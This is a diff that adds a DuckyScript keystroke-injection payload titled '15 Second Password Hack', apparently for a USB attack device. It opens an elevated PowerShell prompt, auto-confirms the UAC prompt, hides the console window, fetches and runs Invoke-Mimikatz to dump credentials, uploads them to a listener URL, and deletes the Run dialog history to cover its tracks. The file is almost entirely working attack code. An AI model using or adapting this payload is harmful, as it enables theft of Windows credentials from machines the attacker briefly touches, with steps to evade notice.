@@ -1,0 +1,37 @@
+REM Title: 15 Second Password Hack, Mr. Robot Style
+REM Description: Opens an admin command prompt, bypasses UAC, downloads, and executes Invoke-Mimikatz to exfiltrate credentials.
+
+ATTACKMODE HID STORAGE
+DELAY 2000
+
+REM Step 1: Open an administrative PowerShell command prompt
+GUI r
+DELAY 1000
+STRINGLN powershell Start-Process cmd -Verb runAs
+DELAY 2000
+ALT y
+DELAY 1000
+
+REM Optional Step: Obfuscate the command prompt window to minimize visual footprint
+STRINGLN mode con:cols=18 lines=1
+STRINGLN color FE
+STRINGLN powershell
+DELAY 1000
+
+REM Step 2: Define URLs for the Invoke-Mimikatz script and where to upload credentials
+DEFINE PS1URL http://localhost/scripts/Invoke-Mimikatz.ps1
+DEFINE UPLOADURL http://localhost/mimikatz_listener/listener.php
+
+REM Step 3: Download and execute Invoke-Mimikatz, then upload the results
+STRING powershell 'IEX (New-Object Net.WebClient).DownloadString(''
+STRING PS1URL
+STRING ''); $output=Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString(''
+STRING UPLOADURL
+STRINGLN '', $output)'
+
+REM Optional Step: Clear run dialog history to cover tracks
+DELAY 4000
+STRINGLN powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+ALT F4
+
+REM Ensure your web server hosts both Invoke-Mimikatz script and the listener.php for credential reception
